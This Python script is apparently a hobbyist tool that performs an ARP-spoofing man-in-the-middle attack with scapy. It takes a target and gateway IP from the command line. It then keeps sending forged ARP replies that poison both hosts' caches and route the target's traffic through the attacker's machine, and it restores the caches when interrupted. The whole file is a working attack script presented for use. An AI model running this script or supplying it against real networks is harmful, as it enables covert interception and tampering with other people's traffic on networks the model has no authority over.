#!/bin/python3


from time import sleep
import socket
try:
    import argparse
    import scapy.all as scapy
except:
    print("Error. scapy or argparse library not found.")


# Setting up argument parser to take in command line arguments - in this case target IP and gateway IP
argParser = argparse.ArgumentParser(description="Script to run a man in the middle attack using ARP spoofing")

argParser.add_argument('-g', '--gateway', type=str, help="IP address of the gateway or access point of the network", metavar='', required=True)
argParser.add_argument('-t', '--target', type=str, help="IP address of the target who you want to man in the middle", metavar='', required=True)

args = argParser.parse_args()




def restoreARPCaches(targetIP, correctIP): # Reset the ARP caches for router and target back to original
    targetMAC = ipToMAC(targetIP)
    correctMAC = ipToMAC(correctIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=correctIP, hwsrc=correctMAC) # Setting hwsrc here is required, because we are trying to restore. Therefore need to set it manually
    scapy.send(packet, count=3, verbose=False)


def ipToMAC(ipAddress):  # Resolves MAC addresses from IP addresses
    arpFrame = scapy.ARP(pdst=ipAddress)
    etherFrame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Send to broadcast address

    arpRequest = etherFrame/arpFrame
    
    nodesFound = scapy.srp(arpRequest, timeout=1, verbose=False)[0] 
    
    return nodesFound[0][1].hwsrc


def arpSpoof(targetIP, gatewayIP): 
    targetMAC = ipToMAC(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP)  # Tell target that current machine has the router's IP address, scapy automatically sets the hwsrc to current machines MAC address
    
    scapy.send(packet, verbose=False)


def ipIsValid(ipAddress): # Checks if inputted ip address is valid
    try:
        socket.inet_aton(ipAddress)
        return True

    except socket.error:
        return False




if __name__ == "__main__":
    
    if ipIsValid(args.target) and ipIsValid(args.gateway):
        try:
            while(True):
                arpSpoof(args.gateway, args.target)
                arpSpoof(args.target, args.gateway)
    
                sleep(3)
    
        except KeyboardInterrupt: # When program stops, the ARP tables for the access point and our target need to be fixed and restored back to what they originally were
            print("\n\nRestoring ARP Caches. Thank you for using this ARP spoofer!\n")
            restoreARPCaches(args.target, args.gateway)
            restoreARPCaches(args.gateway, args.target)
            print("\n\nDone!")
    
        except IndexError:
            print("Error. Some IP addresses may not exist")
    
        except PermissionError:
            # This program utilises sockets and networking packet creation, therefore will need sudo to be run
            print("Error. Need to use sudo to run this program")
    else:
        print("Error. IP addresses invalid")

